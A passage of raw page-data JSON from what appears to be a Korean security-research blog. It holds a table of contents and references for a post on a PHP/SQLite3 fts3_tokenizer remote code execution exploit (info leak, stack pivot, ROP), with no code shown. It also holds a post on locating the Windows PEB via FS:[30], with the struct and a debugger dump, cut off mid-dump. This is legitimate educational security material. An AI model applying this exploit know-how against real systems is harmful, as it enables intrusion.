3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>참조</h1>\n<hr>\n<p><a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Qian-Exploring-The-New-World-Remote-Exploitation-Of-SQLite-And-Curl-wp.pdf\">us 19 Qian Exploring The New World Remote Exploitation Of SQLite And Curl wp</a></p>\n<p><a href=\"https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf\">us 17 Feng Many Birds One Stone Exploiting A Single SQLite Vulnerability Across Multiple Software</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#php-sandbox\">PHP Sandbox</a></p>\n<ul>\n<li><a href=\"#php-debugging\">PHP Debugging</a></li>\n<li><a href=\"#safe-mode-bypass\">Safe Mode Bypass</a></li>\n<li><a href=\"#php-sqlite-%EB%AA%A8%EB%93%88-php-53\">PHP SQLite 모듈 (PHP 5.3≥)</a></li>\n<li><a href=\"#fts3_tokenizer-overview\">fts3_tokenizer Overview</a></li>\n<li><a href=\"#sqlite-fts3-%EA%B8%B0%EB%8A%A5%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%9C-%EA%B2%80%EC%83%89-%EB%B0%A9%EC%95%88\">SQLite fts3 기능을 활용한 검색 방안</a></li>\n<li><a href=\"#%EC%82%AC%EC%9A%A9%EC%9E%90%EA%B0%80-%EC%A7%80%EC%A0%95%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-tokenizer%EC%9D%98-callback-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EC%8B%9D\">사용자가 지정할 수 있는 tokenizer의 Callback 처리 방식</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#sqlite-fts3-%EC%B7%A8%EC%95%BD%EC%A0%90\">SQLite fts3 취약점</a></p>\n<ul>\n<li><a href=\"#fts3-module-base-address-leaked\">fts3 module base address leaked</a></li>\n<li><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\">SQLite fts3_tokenizer(), fts3_tokenizer()</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\">fts3 callback을 통한 임의의 코드 실행 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\">xOpen 취약점</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\">Exploit 공격 흐름도</a></p>\n</li>\n<li>\n<p><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\">x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</a></p>\n<ul>\n<li><a href=\"#fts3_tokenizer-info-leak\">fts3_tokenizer info leak</a></li>\n<li><a href=\"#fts3-tokenizer-callback\">fts3 tokenizer callback</a></li>\n<li><a href=\"#fts3-tokenizer-%EB%91%90-%EB%B2%88%EC%A7%B8-%EC%9D%B8%EC%9E%90-ebp-%EB%A0%88%EC%A7%80%EC%8A%A4%ED%84%B0-%EC%A1%B0%EC%9E%91\">fts3 tokenizer 두 번째 인자 ebp 레지스터 조작</a></li>\n<li><a href=\"#stack-pivot%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-payload-data-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%9C%84%EC%B9%98-%EB%B3%80%EA%B2%BD-%EC%9E%91%EC%97%85\">Stack Pivot를 이용한 Payload data 메모리 위치 변경 작업</a></li>\n<li><a href=\"#rop-%EA%B8%B0%EB%B2%95%EC%9D%84-%ED%99%9C%EC%9A%A9%ED%95%98%EC%97%AC-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%88%98%ED%96%89\">ROP 기법을 활용하여 RCE 취약점 수행</a></li>\n<li><a href=\"#rop%EB%A5%BC-%ED%99%9C%EC%9A%A9%ED%95%B4%EC%84%9C-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%9D%BC%EC%9D%B4%EB%B8%8C%EB%9F%AC%EB%A6%AC-%ED%95%A8%EC%88%98-%ED%98%B8%EC%B6%9C-%EC%A7%84%ED%96%89\">ROP를 활용해서 시스템 라이브러리 함수 호출 진행</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 20, 2020","title":"SQLite3 fts3_tokenizer() Remote Code Execution 취약점 연구","categories":"Web","author":"Zer0Luck","emoji":"🥙"},"fields":{"slug":"/php-sqlite3-1day-rce/"}},"prev":{"id":"3c959693-35cd-5fa0-bdb5-e82315df4c6d","html":"<ul>\n<li>window NT 데이터 구조체 이며 프로세스 정보를 담고 있는 구조체</li>\n</ul>\n<h2 id=\"peb-접근-방법\" style=\"position:relative;\"><a href=\"#peb-%EC%A0%91%EA%B7%BC-%EB%B0%A9%EB%B2%95\" aria-label=\"peb 접근 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB 접근 방법</h2>\n<ul>\n<li>TEB.ProcessEnvironmentBlock 멤버가 PEB 구조체의 주소</li>\n<li>TEB 구조체는 FS 세그먼트 셀렉터가 가리키는 세그먼트 메모리의 base address에 위치한다.</li>\n<li>그리고 ProcessEnvironmentBlock 멤버는 TEB 구조체 시작 부터 30 옵셋만큼 떨어져 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> TEB<span class=\"token punctuation\">.</span>ProcessEnvironmentBlock <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<h2 id=\"method-1\" style=\"position:relative;\"><a href=\"#method-1\" aria-label=\"method 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>method 1</h2>\n<ul>\n<li>바로 PEB 주소를 구하는 방법</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV EAX<span class=\"token punctuation\">,</span> DWORD PTR FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span>      <span class=\"token punctuation\">;</span> FS<span class=\"token punctuation\">[</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<h2 id=\"method-2\" style=\"position:relative;\"><a href=\"#method-2\" aria-label=\"method 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>method 2</h2>\n<ul>\n<li>TEB 주소를 구한후 ProcessEnvironmentBlock 멤버를 이용</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">MOV EAX<span class=\"token punctuation\">,</span> DWORD PTR FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span>       <span class=\"token punctuation\">;</span> FS<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of TEB\nMOV EAX<span class=\"token punctuation\">,</span> DWORD PTR DS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span>EAX<span class=\"token operator\">+</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span>   <span class=\"token punctuation\">;</span> DS<span class=\"token punctuation\">[</span>EAX<span class=\"token operator\">+</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> address of PEB</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAABoklEQVQozz3RUW/TMBAH8Hz/j0EHLwjEHsZomQQMqahjaJ0G7douTVIncRyf47MTJ07axqgKVPo93Mtfuvuf51rsKp4n2zKPdgBB+mlfLZ2tnMWjEQfNnMVBbzEJNyzaSEaqItubwsvjUgsIlo+YBCz1k3hSwqqrZFeCxcxK2pUwaEsQaVBlYQnJwYDrlHcwyiBELwtkRFMf6NSqP3sj9kZ0JewrGOYBI9uCBrWkrc6dRc+1qimBxds8WqWMvkRfK/jYVSvXYt/IvpGuxUHf4m67kmzXW3UwxbGWnrOq0ZARP9k8reNgsf7CyEiJy6566ht9Cg8HN/JYSyULhagVKkSF0nOdqkugxIfd2qc7n9zZ4nOtvp0Kq+W/cIuu032rcs4ZB84BhCik9ICGGlKeRgpSCZnIGfJMAVVADfJGi0YLg7xgcVVky/mv+Wy6fv4d+mtKQm/24/tkfD25uZ5cXd2Oxw/3MxYHkJEzweKMBM8P93S7tDS0OTn3793eTF6NLi4+vBm9e/3+8u3dz+lpyfNvT4WpWuWL+ZwnoetN3yr331/SJuwAkbF/mwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/0e108b97323267fb25a1db164ed8e537/37523/0.png\"\n        srcset=\"/static/0e108b97323267fb25a1db164ed8e537/e9ff0/0.png 180w,\n/static/0e108b97323267fb25a1db164ed8e537/f21e7/0.png 360w,\n/static/0e108b97323267fb25a1db164ed8e537/37523/0.png 720w,\n/static/0e108b97323267fb25a1db164ed8e537/302a4/0.png 1080w,\n/static/0e108b97323267fb25a1db164ed8e537/07a9c/0.png 1440w,\n/static/0e108b97323267fb25a1db164ed8e537/3a5d5/0.png 1807w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>FS:[0x30] 주소 값을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"peb-구조체-정의\" style=\"position:relative;\"><a href=\"#peb-%EA%B5%AC%EC%A1%B0%EC%B2%B4-%EC%A0%95%EC%9D%98\" aria-label=\"peb 구조체 정의 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PEB 구조체 정의</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_PEB</span> <span class=\"token punctuation\">{</span>\n  BYTE                          Reserved1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  BYTE                          BeingDebugged<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved2<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved3<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PPEB_LDR_DATA                 Ldr<span class=\"token punctuation\">;</span>\n  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved4<span class=\"token punctuation\">[</span><span class=\"token number\">104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved5<span class=\"token punctuation\">[</span><span class=\"token number\">52</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine<span class=\"token punctuation\">;</span>\n  BYTE                          Reserved6<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  PVOID                         Reserved7<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  ULONG                         SessionId<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> PEB<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>PPEB<span class=\"token punctuation\">;</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">ntdll<span class=\"token operator\">!</span>_PEB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> InheritedAddressSpace <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x001</span> ReadImageFileExecOptions <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x002</span> BeingDebugged    <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> BitField         <span class=\"token operator\">:</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> ImageUsesLargePages <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsProtectedProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsImageDynamicallyRelocated <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> SkipPatchingUser32Forwarders <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsPackagedProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsAppContainer   <span class=\"token operator\">:</span> Pos <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsProtectedProcessLight <span class=\"token operator\">:</span> Pos <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x003</span> IsLongPathAwareProcess <span class=\"token operator\">:</span> Pos <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> Padding0         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> Mutant           <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> ImageBaseAddress <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Ldr              <span class=\"token operator\">:</span> Ptr64 _PEB_LDR_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x020</span> ProcessParameters <span class=\"token operator\">:</span> Ptr64 _RTL_USER_PROCESS_PARAMETERS\n   <span class=\"token operator\">+</span><span class=\"token number\">0x028</span> SubSystemData    <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x030</span> ProcessHeap      <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x038</span> FastPebLock      <span class=\"token operator\">:</span> Ptr64 _RTL_CRITICAL_SECTION\n   <span class=\"token operator\">+</span><span class=\"token number\">0x040</span> AtlThunkSListPtr <span class=\"token operator\">:</span> Ptr64 _SLIST_HEADER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x048</span> IFEOKey          <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> CrossProcessFlags <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessInJob     <span class=\"token operator\">:</span> Pos <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessInitializing <span class=\"token operator\">:</span> Pos <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingVEH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingVCH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessUsingFTH  <span class=\"token operator\">:</span> Pos <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessPreviouslyThrottled <span class=\"token operator\">:</span> Pos <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessCurrentlyThrottled <span class=\"token operator\">:</span> Pos <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ProcessImagesHotPatched <span class=\"token operator\">:</span> Pos <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> Bit\n   <span class=\"token operator\">+</span><span class=\"token number\">0x050</span> ReservedBits0    <span class=\"token operator\">:</span> Pos <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span> Bits\n   <span class=\"token operator\">+</span><span class=\"token number\">0x054</span> Padding1         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x058</span> KernelCallbackTable <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x058</span> UserSharedInfoPtr <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x060</span> SystemReserved   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x064</span> AtlThunkSListPtr32 <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x068</span> ApiSetMap        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x070</span> TlsExpansionCounter <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x074</span> Padding2         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x078</span> TlsBitmap        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x080</span> TlsBitmapBits    <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x088</span> ReadOnlySharedMemoryBase <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x090</span> SharedData       <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x098</span> ReadOnlyStaticServerData <span class=\"token operator\">:</span> Ptr64 Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0a0</span> AnsiCodePageData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0a8</span> OemCodePageData  <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0b0</span> UnicodeCaseTableData <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0b8</span> NumberOfProcessors <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0bc</span> NtGlobalFlag     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c0</span> CriticalSectionTimeout <span class=\"token operator\">:</span> _LARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0c8</span> HeapSegmentReserve <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0d0</span> HeapSegmentCommit <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0d8</span> HeapDeCommitTotalFreeThreshold <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0e0</span> HeapDeCommitFreeBlockThreshold <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0e8</span> NumberOfHeaps    <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0ec</span> MaximumNumberOfHeaps <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0f0</span> ProcessHeaps     <span class=\"token operator\">:</span> Ptr64 Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x0f8</span> GdiSharedHandleTable <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x100</span> ProcessStarterHelper <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x108</span> GdiDCAttributeList <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x10c</span> Padding3         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x110</span> LoaderLock       <span class=\"token operator\">:</span> Ptr64 _RTL_CRITICAL_SECTION\n   <span class=\"token operator\">+</span><span class=\"token number\">0x118</span> OSMajorVersion   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x11c</span> OSMinorVersion   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x120</span> OSBuildNumber    <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x122</span> OSCSDVersion     <span class=\"token operator\">:</span> Uint2B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x124</span> OSPlatformId     <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x128</span> ImageSubsystem   <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x12c</span> ImageSubsystemMajorVersion <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x130</span> ImageSubsystemMinorVersion <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x134</span> Padding4         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x138</span> ActiveProcessAffinityMask <span class=\"token operator\">:</span> Uint8B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x140</span> GdiHandleBuffer  <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">60</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x230</span> PostProcessInitRoutine <span class=\"token operator\">:</span> Ptr64     <span class=\"token keyword\">void</span> \n   <span class=\"token operator\">+</span><span class=\"token number\">0x238</span> TlsExpansionBitmap <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x240</span> TlsExpansionBitmapBits <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c0</span> SessionId        <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c4</span> Padding5         <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> UChar\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2c8</span> AppCompatFlags   <span class=\"token operator\">:</span> _ULARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2d0</span> AppCompatFlagsUser <span class=\"token operator\">:</span> _ULARGE_INTEGER\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2d8</span> pShimData        <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2e0</span> AppCompatInfo    <span class=\"token operator\">:</span> Ptr64 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2e8</span> CSDVersion       <span class=\"token operator\">:</span> _UNICODE_STRING\n   <span class=\"token operator\">+</span><span class=\"token number\">0x2f8</span> ActivationContextData <span class=\"token operator\">:</span> Ptr64 _ACTIVATION_CONTEXT_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x300</span> ProcessAssemblyStorageMap <span class=\"token operator\">:</span> Ptr64 _ASSEMBLY_STORAGE_MAP\n   <span class=\"token operator\">+</span><span class=\"token number\">0x308</span> SystemDefaultActivationContextData <span class=\"token operator\">:</span> Ptr64 _ACTIVATION_CONTEXT_DATA\n   <span class=\"token operator\">+</span><span class=\"token number\">0x310</span> SystemAssemblyStorageMap <span class=\"token operator\">:</span> Ptr64 _ASSEMBLY_STORAGE_MAP\n   <span class=\"token operator\">+</span><span class=\"token number\">0x318</span> MinimumStackCommit <span class=\"token operator\">:</span> 